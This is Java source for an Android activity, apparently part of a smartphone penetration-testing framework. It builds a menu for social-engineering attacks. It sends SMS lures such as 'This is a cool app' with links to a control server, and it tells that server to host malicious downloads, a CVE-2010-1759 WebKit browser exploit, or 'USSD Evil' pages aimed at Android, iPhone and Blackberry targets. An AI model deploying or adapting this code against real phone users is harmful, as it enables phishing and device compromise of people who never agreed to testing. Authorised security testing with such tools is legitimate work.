package com.bulbsecurity.framework.app;

import java.util.ArrayList;
import java.util.List;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Spinner;
import android.widget.Toast;


public class SocialAttackActivity extends Activity  implements AdapterView.OnItemSelectedListener, OnClickListener{
	
	 private Spinner spinner1, spinner2, spinner3;
	  private Button btnSubmit;
	  private EditText edittext1, edittext2, edittext3;
	  
	@Override
	  public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.socialattack);
		btnSubmit = (Button) findViewById(R.id.btnSubmit);
		btnSubmit.setEnabled(false);
		btnSubmit.setClickable(false);
		btnSubmit.setOnClickListener(this); 
		spinner3 = (Spinner) findViewById(R.id.spinner3);
		spinner3.setEnabled(false);
		edittext1 = (EditText) findViewById(R.id.edittext);
		edittext1.setVisibility(View.INVISIBLE);
		edittext2 = (EditText) findViewById(R.id.edittext2);
		edittext2.setVisibility(View.INVISIBLE);
		edittext3 = (EditText) findViewById(R.id.edittext3);
		edittext3.setVisibility(View.INVISIBLE);
		spinner1 = (Spinner) findViewById(R.id.spinner1);
		spinner1.setOnItemSelectedListener(this);
		spinner2 = (Spinner) findViewById(R.id.spinner2);
		spinner2.setEnabled(false);
		spinner2.setOnItemSelectedListener(this);
		spinner3.setOnItemSelectedListener(this);
		
}

	@Override
	public void onClick(View arg0) {
		String path, filename, number;
		String key = ((FrameworkAndroidApp)this.getApplication()).getkey();
		String ip = ((FrameworkAndroidApp)this.getApplication()).getcontrolIP();
		String messagestring;
		String sendstr;
		Spinner type1 = (Spinner) findViewById(R.id.spinner1);
	 	 Spinner type2 = (Spinner) findViewById(R.id.spinner2);
			Spinner type3 = (Spinner) findViewById(R.id.spinner3);
			EditText edit1 = (EditText) findViewById(R.id.edittext);
			EditText edit2 = (EditText) findViewById(R.id.edittext2);
			EditText edit3 = (EditText) findViewById(R.id.edittext3);
			Button button1 = (Button) findViewById(R.id.btnSubmit);
			String sel = type1.getSelectedItem().toString();
			if (sel.equals("Direct Download"))
			{
				path = edit1.getText().toString();
				filename = edit2.getText().toString();
				number = edit3.getText().toString();
				String mess1 = "This is a cool app: http://";
				String mess2 = mess1.concat(ip);
				String mess3 = mess2.concat(path);
				messagestring = mess3.concat(filename);
				String mess4 = path.concat(" ");
				String mess5 = mess4.concat(filename);
				String sel2 = type2.getSelectedItem().toString();
				if (sel2.equals("Android"))
				{
					String sendstr1 = key.concat(" ");
					String sendstr2 = sendstr1.concat("ANDROID ");
					sendstr = sendstr2.concat(mess5);
					  Intent intent = new Intent(getApplicationContext(),WebUploadService2.class);
				      intent.putExtra("uploadstring", sendstr);
				      startService(intent);
				      Intent intent2 = new Intent(getApplicationContext(),SMSService.class);
						intent2.putExtra("number",number);
						intent2.putExtra("message",messagestring);
						startService(intent2);
						finish();
				}
				else if(sel2.equals("iPhone"))
				{
					String sendstr1 = key.concat(" ");
					String sendstr2 = sendstr1.concat("IPHONE ");
					sendstr = sendstr2.concat(mess5);
					  Intent intent = new Intent(getApplicationContext(),WebUploadService2.class);
				      intent.putExtra("uploadstring", sendstr);
				      startService(intent);
				      Intent intent2 = new Intent(getApplicationContext(),SMSService.class);
						intent2.putExtra("number",number);
						intent2.putExtra("message",messagestring);
						startService(intent2);
						finish();
				}
				else if(sel2.equals("Blackberry"))
				{
					String sendstr1 = key.concat(" ");
					String sendstr2 = sendstr1.concat("BLACKBERRY ");
					sendstr = sendstr2.concat(mess5);
					  Intent intent = new Intent(getApplicationContext(),WebUploadService2.class);
				      intent.putExtra("uploadstring", sendstr);
				      startService(intent);
				      Intent intent2 = new Intent(getApplicationContext(),SMSService.class);
						intent2.putExtra("number",number);
						intent2.putExtra("message",messagestring);
						startService(intent2);
						finish();
				}
			}
			else if(sel.equals("Browser Exploits"))
			{
				String sel2 = type2.getSelectedItem().toString();
				if (sel2.equals("Android"))
				{
					String sel3 = type3.getSelectedItem().toString();
					if (sel3.equals("CVE-2010-1759 Webkit"))
					{
						path = edit1.getText().toString();
						filename = edit2.getText().toString();
						number = edit3.getText().toString();
						String mess1 = "This is a cool page: http://";
						String mess2 = mess1.concat(ip);
						String mess3 = mess2.concat(path);
						messagestring = mess3.concat(filename);
						String mess4 = path.concat(filename);
						String sendstr1 = key.concat(" ");
						String sendstr2 = sendstr1.concat("20101759 ");
						String sendstr3 = sendstr2.concat(path);
						String sendstr4 = sendstr3.concat(" ");
						String sendstr5 = sendstr4.concat(filename);
						String sendstr6 = sendstr5.concat(" ");
						sendstr = sendstr6.concat(number);
						  Intent intent = new Intent(getApplicationContext(),WebUploadService2.class);
					      intent.putExtra("uploadstring", sendstr);
					      startService(intent);
					      Intent intent2 = new Intent(getApplicationContext(),SMSService.class);
							intent2.putExtra("number",number);
							intent2.putExtra("message",messagestring);
							startService(intent2);
							finish();
					}
				}
			}
			else if(sel.equals("USSD Safe"))
			{
				path = edit1.getText().toString();
				filename = edit2.getText().toString();
				number = edit3.getText().toString();
				String mess1 = "This is a cool page: http://";
				String mess2 = mess1.concat(ip);
				String mess3 = mess2.concat(path);
				messagestring = mess3.concat(filename);
				String mess4 = path.concat(filename);
				String sendstr1 = key.concat(" ");
				String sendstr2 = sendstr1.concat("safe ");
				String sendstr3 = sendstr2.concat(path);
				String sendstr4 = sendstr3.concat(" ");
				String sendstr5 = sendstr4.concat(filename);
				String sendstr6 = sendstr5.concat(" ");
				sendstr = sendstr6.concat(number);
				  Intent intent = new Intent(getApplicationContext(),WebUploadService2.class);
			      intent.putExtra("uploadstring", sendstr);
			      startService(intent);
			      Intent intent2 = new Intent(getApplicationContext(),SMSService.class);
					intent2.putExtra("number",number);
					intent2.putExtra("message",messagestring);
					startService(intent2);
					finish();
				
			}
			
	
	else if(sel.equals("USSD Evil"))
	{
		path = edit1.getText().toString();
		filename = edit2.getText().toString();
		number = edit3.getText().toString();
		String mess1 = "This is a cool page: http://";
		String mess2 = mess1.concat(ip);
		String mess3 = mess2.concat(path);
		messagestring = mess3.concat(filename);
		String mess4 = path.concat(filename);
		String sendstr1 = key.concat(" ");
		String sendstr2 = sendstr1.concat("evil ");
		String sendstr3 = sendstr2.concat(path);
		String sendstr4 = sendstr3.concat(" ");
		String sendstr5 = sendstr4.concat(filename);
		String sendstr6 = sendstr5.concat(" ");
		sendstr = sendstr6.concat(number);
		  Intent intent = new Intent(getApplicationContext(),WebUploadService2.class);
	      intent.putExtra("uploadstring", sendstr);
	      startService(intent);
	      Intent intent2 = new Intent(getApplicationContext(),SMSService.class);
			intent2.putExtra("number",number);
			intent2.putExtra("message",messagestring);
			startService(intent2);
			finish();
	}	
}

    @Override
    public void onItemSelected(AdapterView<?> parent, 
      View view, int pos, long id) 
    {
 	   int which = parent.getId();
 	  Spinner type1 = (Spinner) findViewById(R.id.spinner1);
 	 Spinner type2 = (Spinner) findViewById(R.id.spinner2);
		Spinner type3 = (Spinner) findViewById(R.id.spinner3);
		EditText edit1 = (EditText) findViewById(R.id.edittext);
		EditText edit2 = (EditText) findViewById(R.id.edittext2);
		EditText edit3 = (EditText) findViewById(R.id.edittext3);
		Button button1 = (Button) findViewById(R.id.btnSubmit);
			if (which==R.id.spinner1)
 	   {
 		  
    
       		String sel = parent.getItemAtPosition(pos).toString();
       		
       		if (sel.equals("Direct Download"))
       		{
       			type2.setEnabled(true);
       			type3.setEnabled(false);
       		}
       		else if (sel.equals("Browser Exploits"))
       		{
       			type2.setEnabled(true);
       		}
       		else if (sel.equals("USSD Safe"))
       		{
       			edit1.setVisibility(View.VISIBLE);
       			edit2.setVisibility(View.VISIBLE);
       			edit3.setVisibility(View.VISIBLE);
       			type2.setEnabled(false);
       			type3.setEnabled(false);
       			button1.setEnabled(true);
       			button1.setClickable(true);
       		}
       		else if (sel.equals("USSD Evil"))
       		{
       			edit1.setVisibility(View.VISIBLE);
       			edit2.setVisibility(View.VISIBLE);
       			edit3.setVisibility(View.VISIBLE);
       			button1.setEnabled(true);
       			type2.setEnabled(false);
       			type3.setEnabled(false);
       			button1.setClickable(true);
       		}
       		else 
       		{
       			type2.setEnabled(false);
       			type3.setEnabled(false);
       			edit1.setVisibility(View.INVISIBLE);
       			edit2.setVisibility(View.INVISIBLE);
       			edit3.setVisibility(View.INVISIBLE);
       			button1.setEnabled(false);
       			button1.setClickable(false);
       		}
 	   }
			else if (which==R.id.spinner2)
	   {
 		  
 	       		String sel = parent.getItemAtPosition(pos).toString();
 	       	String sel2 = type1.getSelectedItem().toString();
 	       	if (sel.equals("Android"))
      		{
 	    	   if (sel2.equals("Direct Download"))
 	    	   {
 	    		  edit1.setVisibility(View.VISIBLE);
 	       			edit2.setVisibility(View.VISIBLE);
 	       			edit3.setVisibility(View.VISIBLE);
 	       		button1.setEnabled(true);
       			button1.setClickable(true);
       			type3.setEnabled(false);
 	    		   
 	    	   }
 	    	   else if (sel2.equals("Browser Exploits"))
 	    	   {
 	    		  edit1.setVisibility(View.INVISIBLE);
	       			edit2.setVisibility(View.INVISIBLE);
	       			edit3.setVisibility(View.INVISIBLE);
	       		button1.setEnabled(false);
     			button1.setClickable(false);
     			List<String> list = new ArrayList<String>();
    			list.add("Select Exploit");
    			list.add("CVE-2010-1759 Webkit");
    			ArrayAdapter<String> dataAdapter = new ArrayAdapter<String>(parent.getContext(),
    					android.R.layout.simple_spinner_item, list);
    				dataAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
    				type3.setAdapter(dataAdapter);
    				type3.setEnabled(true); 
    				
 	    	   }
 	    	   }
 	       else if (sel.equals("iPhone"))
    		{
	    	   if (sel2.equals("Direct Download"))
	    	   {
	    		  edit1.setVisibility(View.VISIBLE);
	       			edit2.setVisibility(View.VISIBLE);
	       			edit3.setVisibility(View.VISIBLE);
	       		button1.setEnabled(true);
     			button1.setClickable(true);
     			type3.setEnabled(false);
	    		   
	    	   }
	    	   else if (sel2.equals("Browser Exploits"))
	    	   {
	    		  edit1.setVisibility(View.INVISIBLE);
	       			edit2.setVisibility(View.INVISIBLE);
	       			edit3.setVisibility(View.INVISIBLE);
	       		button1.setEnabled(false);
   			button1.setClickable(false);
  				type3.setEnabled(false); 
  				
	    	   }
	    	   }
 	       else if (sel.equals("Blackberry"))
 		{
	    	   if (sel2.equals("Direct Download"))
	    	   {
	    		  edit1.setVisibility(View.VISIBLE);
	       			edit2.setVisibility(View.VISIBLE);
	       			edit3.setVisibility(View.VISIBLE);
	       		button1.setEnabled(true);
  			button1.setClickable(true);
  			type3.setEnabled(false);
	    		   
	    	   }
	    	   else if (sel2.equals("Browser Exploits"))
	    	   {
	    		  edit1.setVisibility(View.INVISIBLE);
	       			edit2.setVisibility(View.INVISIBLE);
	       			edit3.setVisibility(View.INVISIBLE);
	       		button1.setEnabled(false);
			button1.setClickable(false);
				type3.setEnabled(false); 
				
	    	   }
	    	   }
 	     else 
 	     {
 	  	  edit1.setVisibility(View.INVISIBLE);
 			edit2.setVisibility(View.INVISIBLE);
 			edit3.setVisibility(View.INVISIBLE);
 		button1.setEnabled(false);
	button1.setClickable(false);
		type3.setEnabled(false); 
 	     }
    		} 
 	  else if (which==R.id.spinner3)
	   {
 		String sel = parent.getItemAtPosition(pos).toString();
 		if (sel.equals("CVE-2010-1759 Webkit"))
 		{
 		 
 		  edit1.setVisibility(View.VISIBLE);
 			edit2.setVisibility(View.VISIBLE);
 			edit3.setVisibility(View.VISIBLE);
 		button1.setEnabled(true);
		button1.setClickable(true);	
	   }
 		else 
 		{
 			 edit1.setVisibility(View.INVISIBLE);
  			edit2.setVisibility(View.INVISIBLE);
  			edit3.setVisibility(View.INVISIBLE);
  		button1.setEnabled(false);
 		button1.setClickable(false);	
 		}
    }
 	 
    }
		
	

	@Override
	public void onNothingSelected(AdapterView<?> arg0) {
		// TODO Auto-generated method stub
		
	}
	
}